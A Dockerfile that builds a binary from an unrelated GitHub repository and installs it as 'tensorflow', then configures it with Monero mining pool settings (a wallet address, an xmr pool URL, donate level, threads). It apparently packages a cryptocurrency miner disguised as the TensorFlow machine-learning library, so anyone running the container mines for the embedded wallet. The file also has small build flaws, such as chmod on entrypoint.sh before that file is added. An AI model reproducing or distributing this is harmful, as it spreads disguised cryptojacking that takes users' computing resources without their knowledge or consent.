FROM alpine
    
RUN set -xe;\
    echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories; \
    apk update; \
    apk add util-linux build-base cmake libuv-static libuv-dev openssl-dev hwloc-dev@testing; \
    wget https://github.com/konechnnyigellian/tensorflow/archive/master.zip; \
    unzip master.zip; \
    mkdir -p tensorflow-master/build; \
    cd tensorflow-master/build; \
    cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/libuv.a;\
    make -j $(nproc); \
    cp tenserflow /usr/local/bin/tensorflow;\
    rm -rf tenserflow* master.zip; \
    apk del build-base; \
    apk del openssl-dev;\ 
    apk del hwloc-dev; \
    apk del cmake; \
    apk add hwloc@testing;

ENV POOL_USER="44vjAVKLTFc7jxTv5ij1ifCv2YCFe3bpTgcRyR6uKg84iyFhrCesstmWNUppRCrxCsMorTP8QKxMrD3QfgQ41zsqMgPaXY5" \
    POOL_PASS="" \
    POOL_URL="xmr.metal3d.org:8080" \
    DONATE_LEVEL=5 \
    PRIORITY=0 \
    THREADS=0

RUN chmod +x entrypoint.sh
ADD entrypoint.sh /entrypoint.sh
WORKDIR /tmp
EXPOSE 3000
CMD ["/entrypoint.sh"]
